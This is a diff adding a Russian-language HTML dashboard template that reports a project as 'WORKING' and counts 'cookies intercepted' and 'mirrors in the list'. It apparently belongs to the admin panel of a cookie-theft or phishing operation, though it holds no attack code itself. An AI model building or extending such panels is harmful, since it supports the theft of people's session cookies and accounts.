@@ -1,0 +1,50 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="row mb-4">
+    <div class="col-12">
+        <h1 class="h3 text-light fw-bold">Статус проекта</h1>
+    </div>
+</div>
+
+<div class="row g-3 g-md-4">
+    <div class="col-12 col-md-6 col-lg-4">
+        <div class="card bg-dark border-success shadow h-100 text-center">
+            <div class="card-body py-4">
+                <i class="fas fa-check-circle fa-4x text-success mb-3"></i>
+                <h5 class="text-light">Проект онлайн</h5>
+                <span class="badge bg-success fs-5 px-4 py-2">WORKING</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-12 col-md-6 col-lg-4">
+        <div class="card bg-dark border-info shadow h-100 text-center">
+            <div class="card-body py-4">
+                <i class="fas fa-folder-open fa-4x text-info mb-3"></i>
+                <h5 class="text-light">Куков перехвачено</h5>
+                <h2 class="text-white display-5 fw-bold">{{ file_count }}</h2>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-12 col-md-6 col-lg-4">
+        <div class="card bg-dark border-warning shadow h-100 text-center">
+            <div class="card-body py-4">
+                <i class="fas fa-globe fa-4x text-warning mb-3"></i>
+                <h5 class="text-light">Зеркал в списке</h5>
+                <h2 class="text-white display-5 fw-bold">{{ sites_count }}</h2>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-12">
+        <div class="card bg-dark border-secondary shadow">
+            <div class="card-body">
+                <h5 class="text-light"><i class="fas fa-clock"></i> Текущее время сервера</h5>
+                <p class="text-info fs-4">{{ server_time }}</p>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
